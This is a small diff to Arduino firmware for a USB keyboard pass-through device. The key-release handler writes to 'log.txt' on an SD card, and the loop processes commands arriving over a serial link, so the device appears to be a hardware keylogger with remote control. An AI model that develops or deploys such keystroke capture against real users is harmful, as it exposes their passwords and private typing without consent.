@@ -65,8 +65,7 @@ class KbdRptParser : public KeyboardReportParser {
 };
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
-  //Keyboard.rawrelease(key, 0);
-  Keyboard.releaseAll();
+  Keyboard.rawrelease(key, 0);
   SetModifiersArd();
   key_modifier = key|modifiersard,HEX;
   SDlog = SD.open("log.txt", FILE_WRITE);
@@ -194,5 +193,6 @@ void loop() {
     cmd = Serial1.readStringUntil('\n');
     delay(500);
     ProcessCommand();
+    cmd ="";
   }
 }
